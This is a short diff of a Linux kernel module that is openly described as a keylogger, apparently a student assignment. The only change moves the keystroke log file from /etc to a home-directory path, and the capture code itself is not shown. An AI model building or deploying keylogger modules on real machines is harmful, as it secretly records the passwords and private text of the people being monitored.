@@ -12,7 +12,7 @@
 #include <linux/timer.h>
 
 #define DRIVER_DESC     "Keylogger"
-#define fullFileName    "/etc/keylogger.txt"
+#define fullFileName    "~/keylogger.txt"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Pon Stars");  // remember to change before you turn in
